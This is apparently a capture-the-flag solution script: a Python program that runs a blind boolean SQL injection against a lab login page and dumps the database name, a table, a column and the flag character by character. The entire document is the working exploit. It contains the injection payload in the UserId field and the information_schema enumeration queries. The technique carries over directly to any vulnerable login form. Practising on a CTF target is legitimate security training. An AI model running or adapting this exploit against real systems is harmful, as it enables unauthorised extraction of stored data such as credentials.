import requests

def sqli_true(payload: str) -> bool:
    data = {
        "UserId": payload,
        "Password": "1234",
        "Submit": "Login"
    }
    r = requests.post("http://ctf2.segfaulthub.com:7777/sqli_3/login.php", data=data, allow_redirects=False)
    return r.status_code == 200

def dump_data(sql: str) -> str:
    result = ""
    for i in range(1, 50):
        for ascii_code in range(32, 127):
            payload = f"normaltic' or ascii(substr(({sql}),{i},1))={ascii_code} and '1'='1"
            if sqli_true(payload):
                result += chr(ascii_code)
                print(chr(ascii_code), end='')
                break
        else:
            break
    return result

if __name__ == "__main__":
    print("DB: ")
    db = dump_data("database()")
    print("\n")
    print("Table: ")
    table = dump_data(f"select table_name from information_schema.tables where table_schema='{db}' limit 0,1")
    print("\n")
    print("Column:")
    col = dump_data(f"select column_name from information_schema.columns where table_name='{table}' limit 0,1")
    print("\n")
    print("Flag:")
    flag = dump_data(f"select {col} from {table} limit 0,1")
    print("\n")
    print(f"Flag → {flag}")
